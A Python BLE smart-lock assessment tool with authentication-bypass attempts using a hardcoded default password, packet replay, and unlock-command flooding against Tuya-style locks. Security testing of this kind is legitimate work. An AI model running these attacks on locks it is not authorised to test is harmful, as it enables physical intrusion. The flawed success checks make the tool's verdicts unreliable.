#!/usr/bin/env python3
"""
BLE Smart Lock Security Assessment Framework
Clean, focused, and working version
"""

import asyncio
import logging
import random
import json
import csv
import time
from enum import Enum
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Any
from bleak import BleakClient, BleakScanner
from bleak.exc import BleakError
import argparse
from pathlib import Path
from datetime import datetime

# Logging setup
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s: %(message)s',
    datefmt='%H:%M:%S'
)
logger = logging.getLogger(__name__)

class TestCategory(Enum):
    """Categories of security tests"""
    AUTHENTICATION = "Authentication"
    AUTHORIZATION = "Authorization"
    INPUT_VALIDATION = "Input Validation"
    CRYPTOGRAPHY = "Cryptography"
    AVAILABILITY = "Availability"

@dataclass
class TestResult:
    """Result of a security test"""
    test_name: str
    category: TestCategory
    success: bool
    vulnerable: bool = False
    payload: str = ""
    response: str = ""
    error: str = ""
    duration: float = 0.0

@dataclass
class LockCharacteristic:
    """BLE characteristic for lock control"""
    uuid: str
    name: str
    description: str
    handle: Optional[int] = None
    properties: List[str] = field(default_factory=list)

class SecurityTest:
    """Base class for security tests"""
    def __init__(self, name: str, description: str, category: TestCategory):
        self.name = name
        self.description = description
        self.category = category
        self.results: List[TestResult] = []
    
    async def run(self, device: 'BLESmartLock') -> List[TestResult]:
        """Run test against device"""
        logger.info(f"Running: {self.name}")
        start_time = time.time()
        
        try:
            results = await self._execute(device)
            for result in results:
                result.duration = time.time() - start_time
                self.results.append(result)
        except Exception as e:
            logger.error(f"Test {self.name} failed: {e}")
            self.results.append(TestResult(
                test_name=self.name,
                category=self.category,
                success=False,
                error=str(e)
            ))
        
        return self.results
    
    async def _execute(self, device: 'BLESmartLock') -> List[TestResult]:
        """Test-specific implementation"""
        raise NotImplementedError("Subclasses must implement this method")

class AuthBypassTest(SecurityTest):
    """Test authentication bypass vulnerabilities"""
    def __init__(self):
        super().__init__(
            name="Authentication Bypass",
            description="Test if lock accepts weak or empty credentials",
            category=TestCategory.AUTHENTICATION
        )
    
    async def _execute(self, device: 'BLESmartLock') -> List[TestResult]:
        results = []
        
        test_cases = [
            ("Empty password", b'', "No password at all"),
            ("Null bytes", b'\x00\x00\x00\x00\x00\x00\x00\x00\x00', "All null bytes"),
            ("Default password", device.default_password, "Factory default"),
            ("All ones", b'\xff\xff\xff\xff\xff\xff\xff\xff\xff', "All 0xFF bytes"),
            ("Sequential", b'\x01\x02\x03\x04\x05\x06\x07\x08\x09', "Sequential values"),
        ]
        
        for name, password, description in test_cases:
            logger.info(f"  Testing: {name}")
            
            try:
                # Try to unlock with test password
                unlocked = await device.try_unlock(password)
                
                results.append(TestResult(
                    test_name=self.name,
                    category=self.category,
                    success=True,
                    vulnerable=unlocked,
                    payload=password.hex(),
                    response="Unlocked" if unlocked else "Failed"
                ))
                
                if unlocked:
                    logger.warning(f"  VULNERABILITY: Lock accepts {name}!")
                
            except Exception as e:
                results.append(TestResult(
                    test_name=self.name,
                    category=self.category,
                    success=False,
                    payload=password.hex(),
                    error=str(e)
                ))
            
            await asyncio.sleep(0.5)  # Rate limiting
        
        return results

class CommandInjectionTest(SecurityTest):
    """Test command injection via parameters"""
    def __init__(self):
        super().__init__(
            name="Command Injection",
            description="Test for injection via open time and control values",
            category=TestCategory.INPUT_VALIDATION
        )
    
    async def _execute(self, device: 'BLESmartLock') -> List[TestResult]:
        results = []
        
        # Test extreme open time values
        test_values = [
            (0x00, "Zero - might lock indefinitely"),
            (0xFF, "Max - might unlock forever"),
            (0x7F, "Large value"),
            (0x01, "Minimum"),
        ]
        
        for value, description in test_values:
            logger.info(f"  Testing open time: 0x{value:02x}")
            
            try:
                # Test with valid password but unusual open time
                unlocked = await device.try_unlock(
                    password=device.default_password,
                    open_time=bytes([value])
                )
                
                vulnerable = value > 30  # Consider long unlock times as potential issue
                
                results.append(TestResult(
                    test_name=self.name,
                    category=self.category,
                    success=True,
                    vulnerable=vulnerable,
                    payload=f"open_time={value:02x}",
                    response=f"Accepted (unlocked: {unlocked})"
                ))
                
                if vulnerable:
                    logger.warning(f"  WARNING: Accepts unusually long open time ({value} seconds)")
                
            except Exception as e:
                results.append(TestResult(
                    test_name=self.name,
                    category=self.category,
                    success=False,
                    payload=f"open_time={value:02x}",
                    error=str(e)
                ))
            
            await asyncio.sleep(0.5)
        
        return results

class ReplayAttackTest(SecurityTest):
    """Test for replay attack vulnerability"""
    def __init__(self):
        super().__init__(
            name="Replay Attack",
            description="Test if captured packets can be replayed",
            category=TestCategory.CRYPTOGRAPHY
        )
        self.captured_packets = []
    
    async def _execute(self, device: 'BLESmartLock') -> List[TestResult]:
        results = []
        
        logger.info("  Capturing legitimate unlock sequence...")
        
        # Setup packet capture
        def packet_callback(sender, data):
            self.captured_packets.append({
                'uuid': sender,
                'data': data.hex(),
                'timestamp': time.time()
            })
        
        # Add callback and perform normal unlock
        original_callback = device.notification_callback
        device.notification_callback = packet_callback
        
        try:
            # Perform normal unlock to capture packets
            await device.try_unlock()
            
            if not self.captured_packets:
                results.append(TestResult(
                    test_name=self.name,
                    category=self.category,
                    success=False,
                    error="No packets captured"
                ))
                return results
            
            logger.info(f"  Captured {len(self.captured_packets)} packets")
            
            # Try to replay the captured packets
            logger.info("  Attempting replay...")
            
            # Disable callback for replay
            device.notification_callback = None
            
            for i, packet in enumerate(self.captured_packets):
                try:
                    await device.client.write_gatt_char(
                        packet['uuid'],
                        bytes.fromhex(packet['data']),
                        response=True
                    )
                except Exception as e:
                    logger.debug(f"    Packet {i} failed: {e}")
            
            # Note: We can't actually verify if unlock succeeded without feedback
            # In a real test, you'd monitor the physical lock
            
            results.append(TestResult(
                test_name=self.name,
                category=self.category,
                success=True,
                vulnerable=True,  # Assume vulnerable if packets captured
                payload=f"{len(self.captured_packets)} packets",
                response="Packets captured and replayed"
            ))
            
            logger.warning("  WARNING: Packets can be captured and replayed")
            
        finally:
            # Restore original callback
            device.notification_callback = original_callback
        
        return results

class DoSTest(SecurityTest):
    """Test for Denial of Service vulnerabilities"""
    def __init__(self):
        super().__init__(
            name="Denial of Service",
            description="Test if lock can be overwhelmed or crashed",
            category=TestCategory.AVAILABILITY
        )
    
    async def _execute(self, device: 'BLESmartLock') -> List[TestResult]:
        results = []
        
        # Test 1: Rapid commands
        logger.info("  Testing rapid command execution...")
        try:
            start_time = time.time()
            for i in range(20):
                await device.client.write_gatt_char(
                    device.chars['control'].uuid,
                    b'\x01',
                    response=False  # No response to go faster
                )
                await asyncio.sleep(0.05)  # 50ms between commands
            
            still_connected = device.client.is_connected
            
            results.append(TestResult(
                test_name=self.name,
                category=self.category,
                success=True,
                vulnerable=not still_connected,  # Vulnerable if connection lost
                payload="20 rapid unlock commands",
                response="Connection lost" if not still_connected else "Still connected"
            ))
            
            if not still_connected:
                logger.warning("  VULNERABILITY: Lock disconnected under load!")
            
        except Exception as e:
            results.append(TestResult(
                test_name=self.name,
                category=self.category,
                success=False,
                error=str(e)
            ))
        
        # Reconnect if needed
        if not device.client.is_connected:
            await device.connect()
        
        # Test 2: Invalid characteristic writes
        logger.info("  Testing invalid characteristic access...")
        try:
            # Try to write to a non-existent characteristic
            await device.client.write_gatt_char(
                "0000ffff-0000-1000-8000-00805f9b34fb",  # Random UUID
                b'\x00',
                response=True
            )
            results.append(TestResult(
                test_name=self.name,
                category=self.category,
                success=True,
                vulnerable=True,
                payload="Write to invalid UUID",
                response="Accepted (should reject)"
            ))
            
        except Exception as e:
            # This is good - it rejected the invalid write
            results.append(TestResult(
                test_name=self.name,
                category=self.category,
                success=True,
                vulnerable=False,
                payload="Write to invalid UUID",
                response=f"Properly rejected: {str(e)[:50]}"
            ))
        
        return results

class BLESmartLock:
    """Represents a BLE smart lock device"""
    
    DEFAULT_CHARACTERISTICS = {
        'password': LockCharacteristic(
            uuid="0000ffd6-0000-1000-8000-00805f9b34fb",
            name="Password",
            description="Password input"
        ),
        'result': LockCharacteristic(
            uuid="0000ffd7-0000-1000-8000-00805f9b34fb",
            name="Password Result",
            description="Authentication result"
        ),
        'opentime': LockCharacteristic(
            uuid="0000ffd8-0000-1000-8000-00805f9b34fb",
            name="Open Time",
            description="Unlock duration"
        ),
        'control': LockCharacteristic(
            uuid="0000ffd9-0000-1000-8000-00805f9b34fb",
            name="Lock Control",
            description="Unlock command"
        ),
        'notify': LockCharacteristic(
            uuid="0000ffda-0000-1000-8000-00805f9b34fb",
            name="Notifications",
            description="Status updates"
        )
    }
    
    def __init__(self, mac_address: str):
        self.mac_address = mac_address
        self.client: Optional[BleakClient] = None
        self.chars = self.DEFAULT_CHARACTERISTICS.copy()
        self.notification_callback = None
        self.default_password = bytes.fromhex("001234567800000000")
        self.default_open_time = b'\x03'
        self.default_control = b'\x01'
        self.is_connected = False
    
    async def connect(self, timeout: float = 10.0) -> bool:
        """Connect to the lock"""
        logger.info(f"Connecting to {self.mac_address}...")
        try:
            self.client = BleakClient(self.mac_address, timeout=timeout)
            await self.client.connect()
            self.is_connected = self.client.is_connected
            
            if self.is_connected:
                logger.info("Connected successfully")
                await self._discover_characteristics()
                if self.notification_callback:
                    await self._enable_notifications()
            else:
                logger.error("Failed to connect")
            
            return self.is_connected
            
        except Exception as e:
            logger.error(f"Connection failed: {e}")
            return False
    
    async def _discover_characteristics(self):
        """Discover and map characteristics"""
        for service in self.client.services:
            for char in service.characteristics:
                uuid = char.uuid.lower()
                for key, lc in self.chars.items():
                    if uuid == lc.uuid.lower():
                        self.chars[key].handle = char.handle
                        self.chars[key].properties = char.properties
    
    async def _enable_notifications(self):
        """Enable notifications for relevant characteristics"""
        for key, lc in self.chars.items():
            if lc.properties and 'notify' in lc.properties:
                try:
                    await self.client.start_notify(lc.uuid, self.notification_callback)
                except Exception as e:
                    logger.debug(f"Could not enable notifications for {lc.name}: {e}")
    
    async def try_unlock(self, 
                        password: Optional[bytes] = None,
                        open_time: Optional[bytes] = None,
                        control: Optional[bytes] = None) -> bool:
        """
        Try to unlock the lock with given parameters
        
        Returns:
            bool: True if unlock sequence completed without error
                  (Note: Doesn't guarantee physical unlock without feedback)
        """
        if not self.is_connected:
            raise ConnectionError("Not connected to device")
        
        password = password or self.default_password
        open_time = open_time or self.default_open_time
        control = control or self.default_control
        
        try:
            # Step 1: Send password
            await self.client.write_gatt_char(
                self.chars['password'].uuid,
                password,
                response=True
            )
            await asyncio.sleep(0.3)
            
            # Step 2: Set open time
            await self.client.write_gatt_char(
                self.chars['opentime'].uuid,
                open_time,
                response=True
            )
            await asyncio.sleep(0.3)
            
            # Step 3: Send unlock command
            await self.client.write_gatt_char(
                self.chars['control'].uuid,
                control,
                response=True
            )
            
            # Wait briefly for response
            await asyncio.sleep(0.5)
            
            # Note: Without physical verification, we assume successful command execution
            # In a real test, you'd verify the lock actually opened
            return True
            
        except Exception as e:
            logger.debug(f"Unlock attempt failed: {e}")
            return False
    
    async def disconnect(self):
        """Disconnect from device"""
        if self.client and self.is_connected:
            await self.client.disconnect()
            self.is_connected = False
            logger.info("Disconnected")

class SecurityAssessment:
    """Main security assessment runner"""
    
    def __init__(self, output_dir: str = "assessment_reports"):
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
        self.tests: List[SecurityTest] = []
        self.all_results: List[TestResult] = []
        self.session_id = datetime.now().strftime("%Y%m%d_%H%M%S")
    
    def register_test(self, test: SecurityTest):
        """Register a test to run"""
        self.tests.append(test)
    
    async def run(self, lock: BLESmartLock):
        """Run all registered tests"""
        logger.info("=" * 60)
        logger.info("Starting Security Assessment")
        logger.info(f"Target: {lock.mac_address}")
        logger.info(f"Session: {self.session_id}")
        logger.info("=" * 60)
        
        # Connect to device
        if not await lock.connect():
            logger.error("Failed to connect to device. Aborting.")
            return False
        
        try:
            # Run each test
            for test in self.tests:
                logger.info(f"\nRunning: {test.name}")
                logger.info(f"Description: {test.description}")
                logger.info("-" * 40)
                
                results = await test.run(lock)
                self.all_results.extend(results)
                
                # Show quick summary for this test
                vulnerable = sum(1 for r in results if r.vulnerable)
                if vulnerable:
                    logger.warning(f"  Found {vulnerable} potential vulnerability(ies)")
                else:
                    logger.info("  No obvious vulnerabilities found")
                
                await asyncio.sleep(1)  # Brief pause between tests
            
            # Generate report
            self._generate_report()
            self._print_summary()
            
            return True
            
        except KeyboardInterrupt:
            logger.info("\nAssessment interrupted by user")
            return False
        except Exception as e:
            logger.error(f"Assessment failed: {e}")
            return False
        finally:
            # Clean up
            await lock.disconnect()
    
    def _generate_report(self):
        """Generate detailed JSON report"""
        report = {
            'session_id': self.session_id,
            'timestamp': datetime.now().isoformat(),
            'target_device': None,  # Would be set if we had device info
            'summary': self._get_summary(),
            'detailed_results': []
        }
        
        # Organize results by test
        for test in self.tests:
            test_report = {
                'test_name': test.name,
                'description': test.description,
                'category': test.category.value,
                'results': []
            }
            
            for result in test.results:
                test_report['results'].append({
                    'success': result.success,
                    'vulnerable': result.vulnerable,
                    'payload': result.payload,
                    'response': result.response,
                    'error': result.error,
                    'duration': result.duration
                })
            
            report['detailed_results'].append(test_report)
        
        # Save to file
        report_file = self.output_dir / f"assessment_{self.session_id}.json"
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        # Also save CSV for easy analysis
        csv_file = self.output_dir / f"assessment_{self.session_id}.csv"
        with open(csv_file, 'w', newline='') as f:
            writer = csv.writer(f)
            writer.writerow(['Test', 'Category', 'Vulnerable', 'Payload', 'Response', 'Error'])
            for result in self.all_results:
                writer.writerow([
                    result.test_name,
                    result.category.value,
                    result.vulnerable,
                    result.payload,
                    result.response,
                    result.error
                ])
        
        logger.info(f"\nReports saved:")
        logger.info(f"  JSON: {report_file}")
        logger.info(f"  CSV:  {csv_file}")
    
    def _get_summary(self) -> Dict[str, Any]:
        """Get assessment summary"""
        total_tests = len(self.tests)
        completed_tests = sum(1 for test in self.tests if test.results)
        vulnerabilities = sum(1 for r in self.all_results if r.vulnerable)
        
        return {
            'total_tests': total_tests,
            'completed_tests': completed_tests,
            'vulnerabilities_found': vulnerabilities,
            'success_rate': completed_tests / total_tests if total_tests > 0 else 0
        }
    
    def _print_summary(self):
        """Print assessment summary to console"""
        summary = self._get_summary()
        
        print("\n" + "=" * 60)
        print("ASSESSMENT SUMMARY")
        print("=" * 60)
        print(f"Session ID:     {self.session_id}")
        print(f"Tests Run:      {summary['completed_tests']}/{summary['total_tests']}")
        print(f"Vulnerabilities Found: {summary['vulnerabilities_found']}")
        print("-" * 60)
        
        if summary['vulnerabilities_found'] > 0:
            print("\nVULNERABILITIES DETECTED:")
            print("-" * 60)
            for result in self.all_results:
                if result.vulnerable:
                    print(f"• {result.test_name}")
                    print(f"  Payload: {result.payload}")
                    print(f"  Response: {result.response}")
                    print()
        else:
            print("\nNo critical vulnerabilities detected.")
        
        print("=" * 60)

async def discover_devices(timeout: int = 5):
    """Discover nearby BLE devices"""
    logger.info(f"Scanning for BLE devices (timeout: {timeout}s)...")
    
    devices = await BleakScanner.discover(timeout=timeout, return_adv=True)
    
    if not devices:
        logger.info("No devices found")
        return []
    
    print("\n" + "=" * 60)
    print("DISCOVERED DEVICES")
    print("=" * 60)
    
    device_list = []
    for addr, (device, adv_data) in devices.items():
        name = device.name or "Unknown"
        rssi = adv_data.rssi if adv_data else "N/A"
        
        print(f"MAC:  {addr}")
        print(f"Name: {name}")
        print(f"RSSI: {rssi} dBm")
        
        # Check if it might be a Tuya-style lock
        if adv_data and adv_data.service_uuids:
            tuya_services = [s for s in adv_data.service_uuids if 'ffd' in s.lower()]
            if tuya_services:
                print(f"Note: Contains Tuya-style services")
        
        print("-" * 60)
        device_list.append(addr)
    
    return device_list

async def main():
    """Main function"""
    parser = argparse.ArgumentParser(
        description="BLE Smart Lock Security Assessment Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --discover
  %(prog)s -m 20:C3:8F:D9:3C:7C
  %(prog)s -m 20:C3:8F:D9:3C:7C --tests auth,dos
  %(prog)s -m 20:C3:8F:D9:3C:7C --output my_assessment
        """
    )
    
    parser.add_argument('-m', '--mac', help='Target device MAC address')
    parser.add_argument('-d', '--discover', action='store_true',
                       help='Discover nearby BLE devices')
    parser.add_argument('-t', '--tests', default='all',
                       help='Tests to run (comma-separated: auth,command,replay,dos or "all")')
    parser.add_argument('-o', '--output', default='assessment_reports',
                       help='Output directory for reports')
    parser.add_argument('--timeout', type=int, default=10,
                       help='Connection timeout in seconds')
    parser.add_argument('-v', '--verbose', action='store_true',
                       help='Enable verbose logging')
    
    args = parser.parse_args()
    
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    if args.discover:
        await discover_devices()
        return
    
    if not args.mac:
        logger.error("Error: MAC address required. Use --discover to find devices.")
        return
    
    # Create assessment
    assessment = SecurityAssessment(output_dir=args.output)
    
    # Register tests based on selection
    test_map = {
        'auth': AuthBypassTest,
        'command': CommandInjectionTest,
        'replay': ReplayAttackTest,
        'dos': DoSTest,
    }
    
    if args.tests.lower() == 'all':
        for test_class in test_map.values():
            assessment.register_test(test_class())
    else:
        for test_name in args.tests.split(','):
            test_name = test_name.strip().lower()
            if test_name in test_map:
                assessment.register_test(test_map[test_name]())
            else:
                logger.warning(f"Unknown test: {test_name}")
    
    if not assessment.tests:
        logger.error("No tests registered. Check test names.")
        return
    
    # Create and test lock
    lock = BLESmartLock(args.mac)
    
    try:
        success = await assessment.run(lock)
        if not success:
            logger.error("Assessment failed")
    except KeyboardInterrupt:
        logger.info("\nAssessment cancelled by user")

if __name__ == "__main__":
    asyncio.run(main())
